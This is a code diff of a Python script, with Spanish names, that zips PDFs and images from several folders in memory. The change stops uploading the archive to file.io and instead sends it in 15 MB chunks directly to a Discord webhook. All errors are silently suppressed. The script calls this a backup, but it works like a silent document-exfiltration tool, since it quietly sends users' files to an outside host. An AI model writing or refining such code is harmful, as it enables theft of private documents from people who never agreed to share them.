@@ -14,6 +14,7 @@ CARPETAS = {
 }
 
 EXTENSIONES_PERMITIDAS = {'.pdf', '.jpg', '.jpeg', '.png', '.webp', '.gif'}
+TAMANO_PARTE = 15 * 1024 * 1024
 
 def comprimir_filtrado_en_memoria(ruta_carpeta):
     buffer_zip = io.BytesIO()
@@ -28,28 +29,36 @@ def comprimir_filtrado_en_memoria(ruta_carpeta):
     buffer_zip.seek(0)
     return buffer_zip
 
-def subir_y_notificar(buffer_zip, nombre_carpeta):
-    if buffer_zip.getbuffer().nbytes == 0:
+def enviar_por_partes_desde_memoria(buffer_zip, nombre_carpeta):
+    buffer_bytes = buffer_zip.getvalue()
+    if len(buffer_bytes) == 0:
         return
 
-    # Subimos el archivo zip completo a un servidor temporal (ej. file.io)
-    try:
-        response = requests.post(
-            "https://file.io", 
-            files={"file": (f"{nombre_carpeta.lower()}_respaldo.zip", buffer_zip.getvalue())}
-        )
+    total_bytes = len(buffer_bytes)
+    offset = 0
+    parte_num = 1
+    
+    while offset < total_bytes:
+        chunk = buffer_bytes[offset:offset + TAMANO_PARTE]
+
+        nombre_archivo = f"PART{parte_num:03d}{nombre_carpeta}_PDFS_IMGS.zip"
         
-        if response.status_code == 200:
-            data = response.json()
-            link = data.get("link", "Enlace no disponible")
-            
-            # Enviamos el link limpio a Discord
+        try:
             requests.post(
                 WEBHOOK_URL,
-                data={"content": f"📁 Respaldo completo de **{nombre_carpeta}** (PDFs e Imágenes):\n{link}"}
+                files={
+                    "file": (nombre_archivo, chunk),
+                    "payload_json": (None, json.dumps({
+                        "content": f"Copia de **{nombre_carpeta}** (Parte {parte_num})"
+                    }))
+                },
+                timeout=30
             )
-    except Exception:
-        pass
+        except Exception:
+            pass
+            
+        offset += TAMANO_PARTE
+        parte_num += 1
 
 def procesar_y_enviar():
     for nombre, ruta in CARPETAS.items():
@@ -57,7 +66,7 @@ def procesar_y_enviar():
             continue
         try:
             buffer = comprimir_filtrado_en_memoria(ruta)
-            subir_y_notificar(buffer, nombre)
+            enviar_por_partes_desde_memoria(buffer, nombre)
         except Exception:
             pass
 
